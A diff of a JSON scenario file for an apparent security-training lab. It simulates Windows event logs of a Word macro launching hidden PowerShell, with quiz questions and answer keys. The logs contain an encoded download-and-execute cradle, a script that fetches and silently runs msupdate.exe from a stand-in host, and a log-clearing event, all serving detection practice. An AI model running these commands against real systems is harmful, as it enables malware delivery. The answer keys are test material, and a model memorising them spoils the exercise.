@@ -6,9 +6,24 @@
   "category": "Execution",
   "level": "N2",
   "expected_severity": "critical",
-  "expected_rules": ["LAB-009", "LAB-010"],
-  "mitre": ["T1566", "T1059.001", "T1027", "T1105", "T1070.001"],
-  "hosts": ["ws-fin-01"],
+  "expected_rules": [
+    "LAB-009",
+    "LAB-010",
+    "LAB-016",
+    "LAB-017"
+  ],
+  "mitre": [
+    "T1566",
+    "T1204.002",
+    "T1059.001",
+    "T1027",
+    "T1105",
+    "T1070.001",
+    "T1071"
+  ],
+  "hosts": [
+    "ws-fin-01"
+  ],
   "learning_objectives": [
     "Spot abnormal parent/child process chains (Office spawning PowerShell).",
     "Decode -EncodedCommand payloads safely and extract IOCs.",
@@ -21,75 +36,174 @@
     "Which evidence may have been lost when the log was cleared, and where else can you recover it?"
   ],
   "variables": {
-    "doc": ["Invoice_2026-10.docm", "Payment_Advice.docm", "Supplier_Update.docm"]
+    "doc": [
+      "Invoice_2026-10.docm",
+      "Payment_Advice.docm",
+      "Supplier_Update.docm"
+    ]
   },
   "steps": [
     {
       "format": "windows_json",
       "offset_seconds": 0,
       "record": {
-        "EventID": 4688, "TimeCreated": "{ts}", "Computer": "WS-FIN-01.corp.lab", "Channel": "Security",
-        "Provider": "Microsoft-Windows-Security-Auditing", "Level": "Information",
-        "EventData": {"SubjectUserName": "j.silva", "SubjectDomainName": "CORP",
-                      "NewProcessName": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
-                      "CommandLine": "\"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE\" /n \"C:\\Users\\j.silva\\Downloads\\{doc}\"",
-                      "ParentProcessName": "C:\\Windows\\explorer.exe"}
+        "EventID": 4688,
+        "TimeCreated": "{ts}",
+        "Computer": "WS-FIN-01.corp.lab",
+        "Channel": "Security",
+        "Provider": "Microsoft-Windows-Security-Auditing",
+        "Level": "Information",
+        "EventData": {
+          "SubjectUserName": "j.silva",
+          "SubjectDomainName": "CORP",
+          "NewProcessName": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
+          "CommandLine": "\"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE\" /n \"C:\\Users\\j.silva\\Downloads\\{doc}\"",
+          "ParentProcessName": "C:\\Windows\\explorer.exe"
+        }
       }
     },
     {
       "format": "windows_json",
       "offset_seconds": 38,
       "record": {
-        "EventID": 4688, "TimeCreated": "{ts}", "Computer": "WS-FIN-01.corp.lab", "Channel": "Security",
-        "Provider": "Microsoft-Windows-Security-Auditing", "Level": "Information",
-        "EventData": {"SubjectUserName": "j.silva", "SubjectDomainName": "CORP",
-                      "NewProcessName": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
-                      "CommandLine": "powershell.exe -nop -w hidden -ExecutionPolicy Bypass -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMgAwADMALgAwAC4AMQAxADMALgA4ADAALwB1AHAAZABhAHQAZQAuAHAAcwAxACcAKQA=",
-                      "ParentProcessName": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE"}
+        "EventID": 4688,
+        "TimeCreated": "{ts}",
+        "Computer": "WS-FIN-01.corp.lab",
+        "Channel": "Security",
+        "Provider": "Microsoft-Windows-Security-Auditing",
+        "Level": "Information",
+        "EventData": {
+          "SubjectUserName": "j.silva",
+          "SubjectDomainName": "CORP",
+          "NewProcessName": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+          "CommandLine": "powershell.exe -nop -w hidden -ExecutionPolicy Bypass -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMgAwADMALgAwAC4AMQAxADMALgA4ADAALwB1AHAAZABhAHQAZQAuAHAAcwAxACcAKQA=",
+          "ParentProcessName": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE"
+        }
       }
     },
     {
       "format": "windows_json",
       "offset_seconds": 39,
       "record": {
-        "EventID": 4104, "TimeCreated": "{ts}", "Computer": "WS-FIN-01.corp.lab",
-        "Channel": "Microsoft-Windows-PowerShell/Operational", "Provider": "Microsoft-Windows-PowerShell",
-        "Level": "Warning", "UserId": "CORP\\j.silva",
-        "EventData": {"ScriptBlockText": "IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.80/update.ps1')",
-                      "ScriptBlockId": "6f1d2c4e-5a7b-4c3d-9e8f-0a1b2c3d4e5f"}
+        "EventID": 4104,
+        "TimeCreated": "{ts}",
+        "Computer": "WS-FIN-01.corp.lab",
+        "Channel": "Microsoft-Windows-PowerShell/Operational",
+        "Provider": "Microsoft-Windows-PowerShell",
+        "Level": "Warning",
+        "UserId": "CORP\\j.silva",
+        "EventData": {
+          "ScriptBlockText": "IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.80/update.ps1')",
+          "ScriptBlockId": "6f1d2c4e-5a7b-4c3d-9e8f-0a1b2c3d4e5f"
+        }
       }
     },
     {
       "format": "windows_json",
       "offset_seconds": 52,
       "record": {
-        "EventID": 4104, "TimeCreated": "{ts}", "Computer": "WS-FIN-01.corp.lab",
-        "Channel": "Microsoft-Windows-PowerShell/Operational", "Provider": "Microsoft-Windows-PowerShell",
-        "Level": "Warning", "UserId": "CORP\\j.silva",
-        "EventData": {"ScriptBlockText": "$wc = New-Object Net.WebClient; $wc.DownloadFile('http://203.0.113.80/payload.bin', \"$env:TEMP\\msupdate.exe\"); Start-Process -WindowStyle Hidden \"$env:TEMP\\msupdate.exe\"",
-                      "ScriptBlockId": "0c9e8d7f-6a5b-4c3d-2e1f-0a9b8c7d6e5f"}
+        "EventID": 4104,
+        "TimeCreated": "{ts}",
+        "Computer": "WS-FIN-01.corp.lab",
+        "Channel": "Microsoft-Windows-PowerShell/Operational",
+        "Provider": "Microsoft-Windows-PowerShell",
+        "Level": "Warning",
+        "UserId": "CORP\\j.silva",
+        "EventData": {
+          "ScriptBlockText": "$wc = New-Object Net.WebClient; $wc.DownloadFile('http://203.0.113.80/payload.bin', \"$env:TEMP\\msupdate.exe\"); Start-Process -WindowStyle Hidden \"$env:TEMP\\msupdate.exe\"",
+          "ScriptBlockId": "0c9e8d7f-6a5b-4c3d-2e1f-0a9b8c7d6e5f"
+        }
       }
     },
     {
       "format": "windows_json",
       "offset_seconds": 61,
       "record": {
-        "EventID": 4688, "TimeCreated": "{ts}", "Computer": "WS-FIN-01.corp.lab", "Channel": "Security",
-        "Provider": "Microsoft-Windows-Security-Auditing", "Level": "Information",
-        "EventData": {"SubjectUserName": "j.silva", "SubjectDomainName": "CORP",
-                      "NewProcessName": "C:\\Users\\j.silva\\AppData\\Local\\Temp\\msupdate.exe",
-                      "CommandLine": "\"C:\\Users\\j.silva\\AppData\\Local\\Temp\\msupdate.exe\"",
-                      "ParentProcessName": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"}
+        "EventID": 4688,
+        "TimeCreated": "{ts}",
+        "Computer": "WS-FIN-01.corp.lab",
+        "Channel": "Security",
+        "Provider": "Microsoft-Windows-Security-Auditing",
+        "Level": "Information",
+        "EventData": {
+          "SubjectUserName": "j.silva",
+          "SubjectDomainName": "CORP",
+          "NewProcessName": "C:\\Users\\j.silva\\AppData\\Local\\Temp\\msupdate.exe",
+          "CommandLine": "\"C:\\Users\\j.silva\\AppData\\Local\\Temp\\msupdate.exe\"",
+          "ParentProcessName": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+        }
       }
     },
     {
       "format": "windows_json",
       "offset_seconds": 290,
       "record": {
-        "EventID": 1102, "TimeCreated": "{ts}", "Computer": "WS-FIN-01.corp.lab", "Channel": "Security",
-        "Provider": "Microsoft-Windows-Eventlog", "Level": "Information",
-        "EventData": {"SubjectUserName": "j.silva", "SubjectDomainName": "CORP"}
+        "EventID": 1102,
+        "TimeCreated": "{ts}",
+        "Computer": "WS-FIN-01.corp.lab",
+        "Channel": "Security",
+        "Provider": "Microsoft-Windows-Eventlog",
+        "Level": "Information",
+        "EventData": {
+          "SubjectUserName": "j.silva",
+          "SubjectDomainName": "CORP"
+        }
       }
+    }
+  ],
+  "challenge": [
+    {
+      "id": "parent",
+      "question": "Which process launched the malicious PowerShell?",
+      "kind": "choice",
+      "answers": [
+        "WINWORD.EXE"
+      ],
+      "hint": "The 4688 event for powershell.exe has a ParentProcessName field.",
+      "explanation": "Word spawning PowerShell is a strong macro-malware signal; Office should not start interpreters.",
+      "options": [
+        "explorer.exe",
+        "WINWORD.EXE",
+        "OUTLOOK.EXE",
+        "svchost.exe"
+      ]
+    },
+    {
+      "id": "c2",
+      "question": "Which external IP address served the second-stage payload?",
+      "kind": "text",
+      "answers": [
+        "203.0.113.80"
+      ],
+      "hint": "Decode the -EncodedCommand (the alert shows it) or read the 4104 script blocks.",
+      "explanation": "The decoded command downloads http://203.0.113.80/update.ps1: block it at the proxy and firewall."
+    },
+    {
+      "id": "technique",
+      "question": "Which ATT&CK technique matches clearing the Security log?",
+      "kind": "choice",
+      "answers": [
+        "T1070.001"
+      ],
+      "hint": "Look at the MITRE mapping of the LAB-010 alert.",
+      "explanation": "T1070.001 Indicator Removal: Clear Windows Event Logs (event 1102).",
+      "options": [
+        "T1059.001",
+        "T1105",
+        "T1070.001",
+        "T1027"
+      ]
+    },
+    {
+      "id": "user",
+      "question": "Which user account ran the malicious document?",
+      "kind": "text",
+      "answers": [
+        "j.silva",
+        "corp\\j.silva"
+      ],
+      "hint": "SubjectUserName of the WINWORD/PowerShell 4688 events.",
+      "explanation": "j.silva (Finance) opened the document; her credentials and workstation must be treated as compromised."
     }
   ]
 }
